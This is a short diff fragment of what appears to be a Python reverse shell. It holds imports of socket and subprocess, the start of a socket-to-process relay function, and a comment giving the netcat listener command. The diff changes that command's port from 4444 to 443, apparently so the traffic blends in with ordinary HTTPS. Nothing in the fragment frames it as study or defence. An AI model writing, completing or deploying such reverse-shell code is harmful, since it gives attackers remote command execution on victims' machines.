@@ -1,6 +1,6 @@
 import os,socket,subprocess,threading;
 
-# On listener: nc -lvp 4444
+# On listener: nc -lvp 443
 
 def s2p(s, p):
     while True:
